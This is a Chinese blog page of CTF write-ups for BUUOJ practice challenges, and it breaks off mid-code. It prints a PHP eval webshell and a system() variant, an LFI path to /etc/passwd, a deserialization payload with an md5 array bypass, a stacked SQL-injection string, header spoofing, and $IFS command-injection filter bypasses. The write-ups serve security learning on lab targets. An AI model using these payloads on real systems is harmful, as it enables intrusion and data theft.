<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>分类: 技术 | 暮色随风</title><meta name="author" content="zha0fe1"><meta name="copyright" content="zha0fe1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF Wiki  BUU BUU  BasicLinux Labs根据提供的地址和端口号使用xshell直接连接靶机，which flag.txt获得目录，进入后cat flag.txt读取flag BUU LFI COURSE 1 LFI（本地文件包含）漏洞  访问页面后得到这样一个php函数 12345highlight_file(__FILE__);if(isset($GET[&amp;#x27">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF每日一题 WP">
<meta property="og:url" content="https://musewithwind.gitee.io/2022/10/26/0051%20CTF%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%20WP/index.html">
<meta property="og:site_name" content="暮色随风">
<meta property="og:description" content="CTF Wiki  BUU BUU  BasicLinux Labs根据提供的地址和端口号使用xshell直接连接靶机，which flag.txt获得目录，进入后cat flag.txt读取flag BUU LFI COURSE 1 LFI（本地文件包含）漏洞  访问页面后得到这样一个php函数 12345highlight_file(__FILE__);if(isset($GET[&amp;#x27">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp">
<meta property="article:published_time" content="2022-10-26T13:36:00.000Z">
<meta property="article:modified_time" content="2023-05-07T10:35:00.000Z">
<meta property="article:author" content="zha0fe1">
<meta property="article:tag" content="网安">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://musewithwind.gitee.io/2022/10/26/0051%20CTF%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%20WP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: zha0fe1","link":"链接: ","source":"来源: 暮色随风","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '分类: 技术',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-07 18:35:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/ctf.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">暮色随风</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF每日一题 WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-26T13:36:00.000Z" title="发表于 2022-10-26 21:36:00">2022-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-07T10:35:00.000Z" title="更新于 2023-05-07 18:35:00">2023-05-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF每日一题 WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><hr>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/">CTF Wiki</a></p>
<hr>
<h2 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUU</a></p>
</blockquote>
<h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><h4 id="Linux-Labs"><a href="#Linux-Labs" class="headerlink" title="Linux Labs"></a>Linux Labs</h4><p>根据提供的地址和端口号使用xshell直接连接靶机，<code>which flag.txt</code>获得目录，进入后<code>cat flag.txt</code>读取flag</p>
<h4 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h4><blockquote>
<p>LFI（本地文件包含）漏洞</p>
</blockquote>
<p>访问页面后得到这样一个php函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$str</span> =<span class="variable">$_GET</span>[file<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">include $_GET[&#x27;</span>file<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>需要构建GET参数，使用?file&#x3D;flag提交试试</p>
<p>报错提示打开文件流flag失败，未找到对应的文件</p>
<p>查询PHP函数，可以知道<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-includes.html">include函数</a>可以在服务器执行PHP文件之前在该文件中插入一个文件的内容，参数为文件路径，因此构建路径<code>file=/flag</code></p>
<p>得到flag</p>
<hr>
<p>本题PHP中其他函数用法：</p>
<ul>
<li><p>highlight_file() ：函数对文件进行 PHP 语法高亮显示。语法通过使用HTML 标签进行高亮</p>
</li>
<li><p>__FILE__：代表文件的绝对路径。例如“D:\www\test.php”。</p>
</li>
<li><p>isset()：bool函数，用于检测变量是否存在。</p>
</li>
<li><p>$_GET：在 PHP 中，预定义的 $_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。</p>
</li>
<li><p>$str：一个字符串变量。</p>
</li>
<li><p>include：包含并运行指定文件。</p>
</li>
</ul>
<p>函数逻辑：</p>
<p>高亮输出当前文件。然后判断表单中”get”的值是否设置，若已设置且不为空，则将值赋给$str变量，这个变量有啥用没有给出。最后，将$_GET所代表的文件用include包含进php程序。</p>
<p>思考：</p>
<p>如何知道flag在哪里？<br>通过输入错误参数值，我们可以获取网页文件路径，此后通过file&#x3D;&#x2F;etc&#x2F;passwd命令可以返回一些东西，也可以返回一些linux中一定有的文件，如&#x2F;etc&#x2F;hosts</p>
<blockquote>
<p>BY 简书 狐萝卜CarroT</p>
</blockquote>
<h4 id="BUU-BRUTE-1"><a href="#BUU-BRUTE-1" class="headerlink" title="BUU BRUTE 1"></a>BUU BRUTE 1</h4><blockquote>
<p>简单的密码爆破</p>
</blockquote>
<ul>
<li>可以看到给出了一个登录框，根据题目名可知需要爆破</li>
<li>首先测试弱口令用户名admin，密码admin</li>
<li>可以知道用户名猜测正确，密码为四位数字，容易想到使用四位数字典</li>
<li>开始使用bp进行爆破<ul>
<li>有效载荷为6490</li>
<li>输入密码6490,获得flag</li>
</ul>
</li>
</ul>
<h4 id="Upload-Labs-Linux"><a href="#Upload-Labs-Linux" class="headerlink" title="Upload-Labs-Linux"></a>Upload-Labs-Linux</h4><blockquote>
<p>考点：使用PHP绕过js实现上传一句话木马，使用中国蚁剑链接网站后台获取flag</p>
</blockquote>
<ul>
<li>绕过js方式<ul>
<li>简单粗暴直接禁用JavaScript</li>
<li>根据格式将一句话马更改为jpg使其合法，使用bp截包后找到文件位置，将后缀改为php，随后放包上传</li>
</ul>
</li>
<li>上传马成功后，网站路径最后变为<code>index.php</code></li>
<li>打开中国蚁剑，新建连接<ul>
<li>打开网页源代码，发现上传文件的执行位置，为<code>../../upload/一句话马文件名(英文).php</code></li>
<li>将路径删除前面的..&#x2F;后复制到目标网页后（记得将该网页的&#x2F;后内容删光后再复制），再将该内容复制到中国蚁剑新连接url</li>
<li>密码输入为构造的一句话马中的内容</li>
</ul>
</li>
<li>浏览网页文件，得到flag</li>
</ul>
<hr>
<p>一句话马： ^yijuhuama</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/12078206.html">浅谈php一句话木马</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>@符号：即使出错也不要报错</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-misc-eval.html">eval()函数</a>：将输入的字符串当作PHP代码执行 ^eval</li>
<li>$_POST:收集来自 method&#x3D;”post” 的表单中的值。</li>
</ul>
<h4 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h4><p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct </span>= <span class="string">&quot;&quot;</span>;  </span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input </span>= <span class="string">&quot;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">   <span class="keyword">public</span><span class="title function_ invoke__"> function __destruct</span>() &#123;  </span><br><span class="line">       <span class="keyword">try</span> &#123;           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());  </span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;  </span><br><span class="line">               <span class="keyword">echo</span><span class="title function_ invoke__"> file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);  </span><br><span class="line">           &#125;  </span><br><span class="line">       &#125; <span class="keyword">catch</span><span class="title function_ invoke__"> </span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">       &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>观察底部代码，需要传入pleaseget、pleasepost分别url传参hackbar传参即可。</li>
<li>最内层if，md5碰撞，弱等于<ul>
<li>方法一：网上有md5值相同原始数据不同的数据，post传入即可</li>
<li>方法二：使用数组绕过，数组数据类型由于不被接受默认为false，而false&#x3D;=false返回true，也可绕过成功</li>
</ul>
</li>
<li>成功执行到最内层if，发现需要反序列化一个obj对象，查看上面的代码，存在析构函数<ul>
<li>可以看到，this-&gt;correct的值为以微秒为单位的uniqid的base64编码，我们需要correct的值等于传进来input的值，因此，手工注入明显不可能，这里搜索资料了解到,php也存在值传递和按地址传递两种传递方式，因此，如果我们给input传的值为correct的地址，当我们访问input时，很明显我们访问的就是correct的值，地址构造成功，payload如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line"><span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">BUU</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;input = &amp;<span class="variable">$a</span> -&gt;correct;  <span class="comment">//给input传送correct的地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>获得序列化obj payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>

<p>构造完毕，最终payload</p>
<p>get部分：<code> ?pleaseget=1` post部分：`pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</code></p>
<p>hackbar-execute执行即可</p>
<h4 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h4><ul>
<li>打开题目是一道典型的文件上传</li>
<li>尝试经典思路，构造一句话马上传，发现上传成功，文件保存为jpg格式</li>
<li>尝试蚁剑连接马，发现连接失败，分析问题，尝试浏览器直接访问马</li>
<li>此处犯了一个非常nt的错误，我把人家给的参数file删了，直接用题目给出的上传地址访问，果然访问失败，将题目给出的上传地址跟到file后，访问成功，但是就是连接不上，参考大佬题解发现这里的一句话马可以修改为<code>&lt;php@eval(system($_POST[&#39;a&#39;]));?&gt;</code>，执行rce</li>
<li>既然连接不上马，我们可以使用eval函数执行system函数，hackbar构造post的系统命令，这样就能看到内部内容</li>
<li>得到flag</li>
</ul>
<h4 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h4><ul>
<li>以前在网上找了半天sqli靶场，废了老大劲安装好，今天在这里看到在线靶场。。。不说了</li>
<li>老样子判断闭合判断字段数暴库爆表爆列爆字段，今天玩一下sqlmap</li>
<li>按照<a href="https://musewithwind.gitee.io/2023/05/04/sqlmap%E4%BD%BF%E7%94%A8/">使用教程</a>顺了一遍流程，成功拿到flag</li>
</ul>
<h4 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h4><ul>
<li>打开题目提示仅允许本地访问</li>
<li>打开bp挂上代理，截包添加[[#^3f997c|xxf头]]</li>
<li>没用，寄</li>
<li>查看题解，发现另一种使得服务器认为是本地的头：X-Real-IP</li>
<li><a target="_blank" rel="noopener" href="https://feeman.blog.csdn.net/article/details/78687545?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">X-Forwarded-For 和 X-Real-IP 的区别</a></li>
<li>进入页面点击登录得到flag</li>
</ul>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="强网杯-随便注-1"><a href="#强网杯-随便注-1" class="headerlink" title="强网杯 随便注 1"></a>强网杯 随便注 1</h4><ul>
<li>打开链接，题目提示的很明显，sql注入</li>
<li>那么好的，判断闭合方式为1’</li>
<li>使用联合查询查看数据库内容</li>
<li>发现select被过滤，大小写，双写内写均无效</li>
<li>寄</li>
<li>看大佬wp，使用了堆叠注入</li>
<li>没啥好说的，直接上payload：<ul>
<li><ul>
<li>1’;SET @sql &#x3D; concat(char(115,101,108,101,99,116), “ * from <code>1919810931114514</code>“); PREPARE yuchuli from @sql; EXECUTE yuchuli;<ul>
<li>大佬首先闭合上一个查询，然后定义变量sql，sql为由s六个字母的ascll值转化为select，再拼接上后续sql语句，再定义预处理，执行预处理，就这样得到flag</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h4><ul>
<li>打开题目链接发现三个新闻链接和一个登录按钮</li>
<li>点击登录按钮发现，登录框和密码输入框，尝试在这里进行sql注入，（据题意），发现没反应，怎么输入都会账号或密码错误</li>
<li>这里发现一个坑点，edgef12打开网络什么文件都不会加载。流汗黄豆，可能是我没配置好</li>
<li>使用谷歌浏览器f12查看网络发现几个php文件，一一查看发现对应新闻链接的内容与页面，且以id作为分割，判断这里存在sql注入</li>
<li>将该php文件链接复制进入，通过id判断闭合方式，发现是数值型注入</li>
<li>爆库爆表爆列爆值</li>
<li>注入得到用户名和密码</li>
<li>登录，得到flag</li>
</ul>
<h4 id="pingpingping"><a href="#pingpingping" class="headerlink" title="pingpingping"></a>pingpingping</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/116247765">命令执行漏洞过滤的绕过姿势</a></p>
</blockquote>
<ul>
<li>打开题目提示<code>/?ip=</code>判断存在rce</li>
<li>URL后输入<code>?ip=;ls</code>发现出现目录中文件<code>flag.php</code> <code>index.php</code><ul>
<li>cat flag.php出现fxck your space，空格不被允许<ul>
<li>Linux代替空格命令<ul>
<li>$IFS </li>
<li>${IFS} </li>
<li>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</li>
<li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能 %20 %09</li>
</ul>
</li>
</ul>
</li>
<li>使用<code>&#123;cat,flag.php&#125;</code>发现fxck your symbol，’{‘和’}’不被允许</li>
<li>使用<code>cat$IFS$1flag.php</code>发现fxck your flag,flag不被允许</li>
</ul>
</li>
<li>用<code>cat$IFS$1index.php</code><ul>
<li>发现index存在flag.php的过滤源码</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);&#x27;</span><span class="comment">////屏蔽了&amp; \ ? * &lt; x&#123;00&#125;-x&#123;20&#125; &gt; &#x27; &quot; \  (  ) [  ]  &#123;  &#125;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span 